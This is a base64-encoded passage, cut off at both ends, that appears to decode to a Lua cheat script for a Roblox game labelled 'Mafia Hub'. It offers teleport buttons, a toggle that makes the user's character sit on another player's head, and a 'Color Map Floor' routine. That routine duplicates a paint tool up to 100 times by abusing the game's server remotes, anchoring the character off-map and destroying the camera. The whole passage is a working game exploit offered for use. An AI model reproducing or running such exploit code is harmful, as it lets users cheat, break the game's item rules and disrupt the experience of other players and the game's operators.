AgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHdhcm4oU2VsZWN0ZWQgcGxheWVyIG5vdCBmb3VuZCBvciBoYXMgbm8gQ2hhcmFjdGVyISkKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbHNlCiAgICAgICAgICAgIGlmIGhlYWRTaXRDb25uZWN0aW9uIHRoZW4KICAgICAgICAgICAgICAgIGhlYWRTaXRDb25uZWN0aW9uRGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICBoZWFkU2l0Q29ubmVjdGlvbiA9IG5pbAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICBlbmQKICAgIGVuZAp9KQoKTG9jYWxQbGF5ZXJUYWJBZGRCdXR0b24oewogICAgTmFtZSA9IFJlZnJlc2ggbGlzdCwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHVwZGF0ZWRQbGF5ZXJzID0gdXBkYXRlUGxheWVyTGlzdCgpCiAgICAgICAgaWYgaGVhZFNpdERyb3Bkb3duIGFuZCB1cGRhdGVkUGxheWVycyB0aGVuCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGhlYWRTaXREcm9wZG93blJlZnJlc2godXBkYXRlZFBsYXllcnMpCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgaWYgc2VsZWN0ZWRIZWFkU2l0IGFuZCBub3QgZ2FtZS5QbGF5ZXJzRmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRIZWFkU2l0KSB0aGVuCiAgICAgICAgICAgICAgICBzZWxlY3RlZEhlYWRTaXQgPSBuaWwKICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBoZWFkU2l0RHJvcGRvd25TZXQoKQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKbG9jYWwgVGFiID0gV2luZG93TWFrZVRhYih7VGVsZXBvcnRzLCB0cH0pIC0tIEljb24gbmFtZSAncG9ydGFsJyBpbiBsb3dlcmNhc2UgZm9yIHRlbGVwb3J0CgotLSBUZWxlcG9ydCBCdXR0b25zCmxvY2FsIHRlbGVwb3J0QnV0dG9ucyA9IHsKICAgIHtUbyB0aGUgQmFja3N0YWdlLCBDRnJhbWUubmV3KDE5MiwgNCwgMjcyKX0sCiAgICB7VG8gdGhlIENpdHkgQ2VudGVyLCBDRnJhbWUubmV3KDEzNiwgNCwgMTE3KX0sCiAgICB7VG8gdGhlIENyaW1lIEFyZWEsIENGcmFtZS5uZXcoLTExOSwgLTI4LCAyMzUpfSwKICAgIHtUbyB0aGUgRGVzZXJ0ZWQgSG91c2UsIENGcmFtZS5uZXcoOTg2LCA0LCA2Myl9LAogICAge1RvIHRoZSBBZ2VuY3kgUG9ydGFsLCBDRnJhbWUubmV3KDY3MiwgNCwgLTI5Nil9LAogICAge1RvIHRoZSBIaWRlb3V0LCBDRnJhbWUubmV3KDUwNSwgLTc1LCAxNDMpfSwKICAgIHtUbyB0aGUgU2Nob29sLCBDRnJhbWUubmV3KC0zMTIsIDQsIDIxMSl9LAogICAge1RvIHRoZSBCcm9vayBDYWZlLCBDRnJhbWUubmV3KDE2MSwgOCwgNTIpfSwKICAgIHtUbyB0aGUgU3RhcnRpbmcgUG9pbnQsIENGcmFtZS5uZXcoLTI2LCA0LCAtMjMpfSwKICAgIHtUbyB0aGUgTWFpbiBBcmNoLCBDRnJhbWUubmV3KC01ODksIDE0MSwgLTU5KX0sCiAgICB7VG8gdGhlIEhvc3BpdGFsLCBDRnJhbWUubmV3KC0zMDksIDQsIDcxKX0sCiAgICB7VG8gdGhlIEFnZW5jeSBCYXNlLCBDRnJhbWUubmV3KDE3OSwgNCwgLTQ2NCl9LAogICAge1RvIHRoZSBXb3Jrc2hvcCdzIEhpZGRlbiBSb29tLCBDRnJhbWUubmV3KDAsIDQsIC00OTUpfSwKICAgIHtUbyBTZWNyZXQgUm9vbSAyLCBDRnJhbWUubmV3KC0zNDMsIDQsIC02MTMpfSwKICAgIHtUbyB0aGUgSXNvbGF0ZWQgSXNsYW5kLCBDRnJhbWUubmV3KC0xOTI1LCAyMywgMTI3KX0sCiAgICB7VG8gdGhlIEhvdGVsIFNxdWFyZSwgQ0ZyYW1lLm5ldygxODIsIDQsIDE1MCl9LAogICAge0NsaW1iIE1vdW50YWluIDEsIENGcmFtZS5uZXcoLTY3MCwgMjUxLCA3NjUpfSwKICAgIHtUbyB0aGUgTWFpbiBCYW5rLCBDRnJhbWUubmV3KDIuMjgsIDQuNjUsIDI1NC41OCl9LAogICAge1RvIHRoZSBDbG90aGluZyBTdG9yZSwgQ0ZyYW1lLm5ldygtNDYuMTUsIDQuNjUsIDI1My4yMCl9LAogICAge1RvIHRoZSBSZWZ1Z2UsIENGcmFtZS5uZXcoLTg4LjQ4LCAyMi4wNSwgMjYyLjM0KX0sCiAgICB7VG8gdGhlIERlbnRhbCBDbGluaWMsIENGcmFtZS5uZXcoLTUzLjU4LCAyMi4xNSwgMjY1LjYxKX0sCiAgICB7VG8gdGhlIENhZmV0ZXJpYSwgQ0ZyYW1lLm5ldygtOTcuMTIsIDQuNjUsIDI1NC45OSl9Cn0KCmZvciBfLCBidG4gaW4gaXBhaXJzKHRlbGVwb3J0QnV0dG9ucykgZG8KICAgIFRhYkFkZEJ1dHRvbih7CiAgICAgICAgYnRuWzFdLAogICAgICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IGJ0blsyXQogICAgICAgIGVuZAogICAgfSkKZW5kCgoKbG9jYWwgVG9vbHNUYWIgPSBXaW5kb3dNYWtlVGFiKHtJdGVtcywgYmFja3BhY2t9KQoKLS0gQ29sb3IgdGFibGUKbG9jYWwgY29sb3JzVGFibGUgPSB7CiAgICB7TmFtZSA9IFJlZCwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDAsIDApfSwKICAgIHtOYW1lID0gT3JhbmdlLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTY1LCAwKX0sCiAgICB7TmFtZSA9IFllbGxvdywgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMCl9LAogICAge05hbWUgPSBHcmVlbiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigwLCAyNTUsIDApfSwKICAgIHtOYW1lID0gQ3lhbiwgQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigwLCAyNTUsIDI1NSl9LAogICAge05hbWUgPSBCbHVlLCBDb2xvciA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDI1NSl9LAogICAge05hbWUgPSBQdXJwbGUsIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMTI4LCAwLCAxMjgpfSwKICAgIHtOYW1lID0gQmxhY2ssIENvbG9yID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCl9Cn0KCi0tIEJ1dHRvbiB0byBjb2xvciB0aGUgbWFwClRvb2xzVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBDb2xvciBNYXAgRmxvb3IgW1ZlcnkgT1BdLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgIGxvY2FsIHRvb2xzZWxlY3RlZCA9IFBhaW50Um9sbGVyCmxvY2FsIGR1cGVhbW90ID0gMTAwCmxvY2FsIHBpY2t0b29scmVtb3RlID0gZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpLlJFRmluZEZpcnN0Q2hpbGQoMVRvbzFsKQpsb2NhbCBjbGVhcnRvb2xyZW1vdGUgPSBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxQ2xlYTFyVG9vbDFzKQpsb2NhbCBkdXBpbmcgPSB0cnVlCmxvY2FsIG9sZGNmID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQoKCmxvY2FsIEdyaXBQb3NUYWJsZSA9IHt9CmZvciBpID0gMSwgMTAwIGRvCiAgICBpZiBpID09IDEgdGhlbgogICAgICAgIHRhYmxlLmluc2VydChHcmlwUG9zVGFibGUsIFZlY3RvcjMubmV3KDAsIDUsIDApKSAKICAgIGVsc2UKICAgICAgICB0YWJsZS5pbnNlcnQoR3JpcFBvc1RhYmxlLCBWZWN0b3IzLm5ldygoaSAtIDEpICAxLjIsIDUsIDApKSAKICAgIGVuZAplbmQKCmxvY2FsIHRvb2xDb3VudCA9IDAKZm9yIF8sIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIHRvb2xJc0EoVG9vbCkgYW5kIHRvb2wuTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgIHRvb2xDb3VudCA9IHRvb2xDb3VudCArIDEKICAgIGVuZAplbmQKZm9yIF8sIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckdldENoaWxkcmVuKCkpIGRvCiAgICBpZiB0b29sSXNBKFRvb2wpIGFuZCB0b29sLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICB0b29sQ291bnQgPSB0b29sQ291bnQgKyAxCiAgICBlbmQKZW5kCgppZiB0b29sQ291bnQgPSBkdXBlYW1vdCB0aGVuCiAgICAtLSBVbmVxdWlwcyBhbmQgbW92ZXMgdGhlIHRvb2xzIHRvIHRoZSBkZWZpbmVkIHBvc2l0aW9ucwogICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbElzQShUb29sKSBhbmQgdG9vbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZW5kCiAgICBlbmQKICAgIGZvciBpLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja0dldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbElzQShUb29sKSBhbmQgdG9vbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCBncmlwUG9zSW5kZXggPSBtYXRoLm1pbihpLCAjR3JpcFBvc1RhYmxlKQogICAgICAgICAgICBsb2NhbCBncmlwUG9zID0gR3JpcFBvc1RhYmxlW2dyaXBQb3NJbmRleF0KICAgICAgICAgICAgdG9vbC5HcmlwUG9zID0gZ3JpcFBvcwogICAgICAgIGVuZAogICAgZW5kCmVsc2UKICAgIAogICAgbG9jYWwgYXJncyA9IHsKICAgICAgICBbMV0gPSBDbGVhckFsbFRvb2xzCiAgICB9CiAgICAKICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKVdhaXRGb3JDaGlsZChSRSlXYWl0Rm9yQ2hpbGQoMUNsZWExclRvb2wxcylGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIAogICAgd2FpdCgwLjIpCiAgICAKICAgIGdhbWVHZXRTZXJ2aWNlKFN0YXJ0ZXJHdWkpU2V0Q29yZShTZW5kTm90aWZpY2F0aW9uLCB7CiAgICAgICAgVGl0bGUgPSBNYWZpYSBIdWIgRHVwZSwKICAgICAgICBUZXh0ID0gRG9uJ3QgY2xpY2sgb24gYW55dGhpbmcgd2hpbGUgdGhlIHRvb2xzIGFyZSBiZWluZyBkdXBlZCwKICAgICAgICBCdXR0b24xID0gR290IGl0LAogICAgICAgIER1cmF0aW9uID0gMwogICAgfSkKICAgIAogICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZSB0aGVuCiAgICAgICAgdGFzay53YWl0KCkKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9IGZhbHNlCiAgICBlbmQKICAgIAogICAgd2FpdCgwLjEpCiAgICAKICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpIHRoZW4KICAgICAgICBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKURlc3Ryb3koKQogICAgZW5kCiAgICAKICAgIGZvciBtID0gMSwgMiBkbwogICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ5MCwgOTk5OTk5OTk5LjQxNCwgMC45NzQzNjA0MDYsIC0wLjE3NTczNDA4OCwgMC4xNDA0OTc2MSwgLTAuMTMzNDQxNDA0LCAwLjA1MTQwNTMwNjksIDAuOTg5NzIyNzI5LCAtMC4xODExNTAzMDIsIC0wLjk4MzA5NDY5MiwgMC4wMjY2MzcwOTIyKQogICAgZW5kCiAgICAKICAgIHRhc2sud2FpdCgwLjIpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICB3YWl0KDAuNSkKICAgIAogICAgZm9yIGFpZGosIGFmaCBpbiBwYWlycyhnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIG5vdCBhZmguTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICBpZiBhZmhJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICAgICAgYWZoLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBmb3IgYWllZmhpZXdod2YsIGR2amJ2aiBpbiBwYWlycyhnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja0dldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgZHZqYnZqSXNBKFRvb2wpIHRoZW4KICAgICAgICAgICAgaWYgbm90IGR2amJ2ai5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgICAgICBkdmpidmpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgZm9yIHR0anRqdXRqdXRqanRqLCBkZHZkdmRzdmRmYnJueXR5dG12ZHYgaW4gcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBkZHZkdmRzdmRmYnJueXR5dG12ZHZJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICBpZiBub3QgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2Lm5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgICAgIGRkdmR2ZHN2ZGZicm55dHl0bXZkdkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBmb3IgZmluZGluLCB0b29sbGVsIGluIHBhaXJzKGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbGxlbElzQShUb29sKSB0aGVuCiAgICAgICAgICAgIGlmIHRvb2xsZWwuTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gdHJ1ZQogICAgICAgICAgICAgICAgZm9yIGJhc2MsIGFpamZ3IGluIHBhaXJzKHRvb2xsZWxHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIGFpamZ3Lk5hbWUgPT0gSGFuZGxlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgYWlqZncuTmFtZSA9IEjipWHipW7ipWTipWzipWUKICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxlbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxlbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIHRvbGxsYWhoaGggPSB0b29sbGVsCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgZm9yIGZpaWZpLCB0b29sbGxsIGluIHBhaXJzKGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB0b29sbGxsSXNBKFRvb2wpIHRoZW4KICAgICAgICAgICAgaWYgdG9vbGxsbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgICAgICB0b29sbGxsZm91biA9IHRydWUKICAgICAgICAgICAgICAgIGZvciBuYW5hLCBqanNqc2ogaW4gcGFpcnModG9vbGxsbEdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgampzanNqLk5hbWUgPT0gSGFuZGxlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBqanNqc2ouTmFtZSA9IEjipWHipW7ipWTipWzipWUKICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGZmZWwgPSB0b29sbGxsCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4gPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBpZiB0b29sbGxsZm91biA9PSB0cnVlIHRoZW4KICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9vbGxsZmZlbCkgPT0gbmlsIHRoZW4KICAgICAgICAgICAgdG9vbGxsbGZvdW4gPSBmYWxzZQogICAgICAgIGVuZAogICAgICAgIHJlcGVhdAogICAgICAgICAgICB3YWl0KCkKICAgICAgICB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9vbGxsZmZlbCkgPT0gbmlsCiAgICAgICAgdG9vbGxsbGZvdW4gPSBmYWxzZQogICAgZW5kCiAgICAKICAgIGlmIHRvb2xsbGxmb3VuMiA9PSB0cnVlIHRoZW4KICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9sbGxsYWhoaGgpID09IG5pbCB0aGVuCiAgICAgICAgICAgIHRvb2xsbGxmb3VuMiA9IGZhbHNlCiAgICAgICAgZW5kCiAgICAgICAgcmVwZWF0CiAgICAgICAgICAgIHdhaXQoKQogICAgICAgIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b2xsbGxhaGhoaCkgPT0gbmlsCiAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgIGVuZAogICAgCiAgICB3YWl0KDAuMSkKICAgIAogICAgZm9yIG0gPSAxLCBkdXBlYW1vdCBkbwogICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpIHRoZW4KICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkKICAgICAgICBlbmQKICAgICAgICBpZiBtID0gZHVwZWFtb3QgdGhlbgogICAgICAgIGVsc2VpZiBtID09IGR1cGVhbW90IG9yIG0gPSBkdXBlYW1vdCAtIDEgdGhlbgogICAgICAgIGVuZAogICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgIFsxXSA9IFBpY2tpbmdUb29scywKICAgICAgICAgICAgWzJdID0gdG9vbHNlbGVjdGVkCiAgICAgICAgfQogICAgICAgIHBpY2t0b29scmVtb3RlSW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5CYWNrcGFja1dhaXRGb3JDaGlsZCh0b29sc2VsZWN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICB3YWl0KCkKICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHNlbGVjdGVkXUZpbmRGaXJzdENoaWxkKEhhbmRsZSkuTmFtZSA9IEjipWHipW7ipWTipWzipWUKICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sc2VsZWN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrRmluZEZpcnN0Q2hpbGQodG9vbHNlbGVjdGVkKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgZ2FtZUdldFNlcnZpY2UoU3RhcnRlckd1aSlTZXRDb3JlKFNlbmROb3RpZmljYXRpb24sIHsKICAgICAgICAgICAgVGl0bGUgPSBNYWZpYSBIdWIgVG9vbCwKICAgICAgICAgICAgVGV4dCA9IFRvb2wgRHVwZWQgIC4uIG0gLi4gICAgLi4gZHVwZWFtb3QsCiAgICAgICAgICAgIER1cmF0aW9uID0gMQogICAgICAgIH0pCiAgICAgICAgcmVwZWF0CiAgICAgICAgICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpIHRoZW4KICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIHVudGlsIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2xzZWxlY3RlZCkgPT0gbmlsCiAgICBlbmQKICAgIAogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgIHJlcGVhdAogICAgICAgIHdhaXQoKQogICAgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpID09IG5pbAogICAgcmVwZWF0CiAgICAgICAgd2FpdCgpCiAgICB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZgogICAgCiAgICBmb3IgeiwgeCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIHguTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICB0b29sYW1vdXRoID0gegogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIHdhaXQoKQogICAgZHVwaW5nID0gZmFsc2UKICAgIHdhaXQoMC4xKQogICAgCiAgICBmb3IgaSwgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIHRvb2xJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICB0b29sLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgbG9jYWwgZ3JpcFBvc0luZGV4ID0gbWF0aC5taW4oaSwgI0dyaXBQb3NUYWJsZSkKICAgICAgICAgICAgbG9jYWwgZ3JpcFBvcyA9IEdyaXBQb3NUYWJsZVtncmlwUG9zSW5kZXhdCiAgICAgICAgICAgIGlmIHRvb2xJc0Rlc2NlbmRhbnRPZihnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKSB0aGVuCiAgICAgICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHdhcm4oVG9vbCwgdG9vbC5OYW1lLCBpcyBub3QgaW4gY2hhcmFjdGVyKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICB3YWl0KDEpCiAgICAKICAgIGZ1bmN0aW9uIEVxdWlwRXZlcnl0aGluZygpCiAgICAgICAgCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIKICAgICAgICAKICAgICAgICAKICAgICAgICBsb2NhbCBmdW5jdGlvbiBjaGFuZ2VBbmltYXRpb24odG9vbCkgIAogICAgICAgICAgICBpZiB0b29sRmluZEZpcnN0Q2hpbGQoQ3ljbGVOZXh0QW5pbWF0aW9uKSB0aGVuICAKICAgICAgICAgICAgICAgIHRvb2wuQ3ljbGVOZXh0QW5pbWF0aW9uRmlyZVNlcnZlcigpICAKICAgICAgICAgICAgZW5kICAKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAKICAgICAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMocGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8gIAogIC